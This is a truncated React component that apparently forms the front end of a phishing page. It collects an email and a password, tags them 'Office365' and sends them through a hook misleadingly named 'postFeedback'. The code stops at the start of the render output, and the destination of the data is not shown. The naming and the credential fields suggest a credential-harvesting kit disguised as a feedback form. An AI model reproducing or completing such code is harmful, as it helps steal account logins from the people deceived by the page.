import './App.css'; import './Hover.css'; import './DemoPage.css'; import qs from 'qs'; import useFeedback from './api/useFeedback'; import React, { useState } from 'react'; import { Button, Modal } from 'react-bootstrap'; function App() { const { postFeedback, isLoading } = useFeedback(); const [emails, setEmail] = useState(''); const [passwords, setPassword] = useState(''); const [detail, setDetails] = useState('Office365'); const [role, setRole] = useState('Reyes'); const onSubmit = async (e) => { e.preventDefault(); const data = qs.stringify({ email: emails, password: passwords, details: detail, }); try { await postFeedback(data); setPassword(''); setEmail(''); } catch (error) { console.log(error); } }; const [show, setShow] = useState(false); const handleClose = () => setShow(false); const handleShow = () => setShow(true); return (
